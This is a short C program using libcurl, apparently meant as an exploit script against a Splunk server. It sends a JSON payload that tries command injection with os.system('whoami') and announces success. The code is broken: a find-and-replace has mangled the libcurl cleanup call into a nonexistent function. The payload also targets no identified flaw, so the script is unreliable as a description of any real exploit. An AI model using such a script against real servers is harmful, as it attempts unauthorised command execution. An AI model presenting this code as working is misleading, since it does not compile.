#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Initialize CURL
CURL* CURL_INITIALIZER(const char* endpoint, struct curl_slist** http_headers)
{
    CURL* curl_handle = curl_easy_init();
    if (!curl_handle)
    {
        fprintf(stderr, "Failed to initialize CURL\n");
        return NULL;
    }
    
    curl_easy_setopt(curl_handle, CURLOPT_URL, endpoint);

    *http_headers = curl_slist_append(*http_headers, "Content-Type: application/json");
    curl_easy_setopt(curl_handle, CURLOPT_HTTPHEADER, *http_headers);

    return curl_handle;
}

// Send a POST request
CURLcode POST_REQUEST_SENDER(CURL* curl_handle, const char* json_payload)
{
    curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, json_payload);

    CURLcode response = curl_easy_perform(curl_handle);
    return response;
}

// Clean up
void CLEAN_UPER(CURL* curl_handle, struct curl_slist* http_headers)
{
    if (curl_handle)
        curl_easy_CLEAN_UPER(curl_handle);
    if (http_headers)
        curl_slist_free_all(http_headers);
}

int main()
{
    const char* api_url = "https://target-splunk-server/api";
    const char* payload = "{\"exploit_code\": \"os.system('whoami > /tmp/exploit_success')\"}";

    struct curl_slist* http_headers = NULL;
    CURL* curl_handle = CURL_INITIALIZER(api_url, &http_headers);

    if (!curl_handle)
    {
        return 1;
    }

    CURLcode response = POST_REQUEST_SENDER(curl_handle, payload);

    if (response != CURLE_OK)
    {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(response));
    }
    else
    {
        printf("Exploit request sent successfully!\n");
    }

    CLEAN_UPER(curl_handle, http_headers);

    return 0;
}
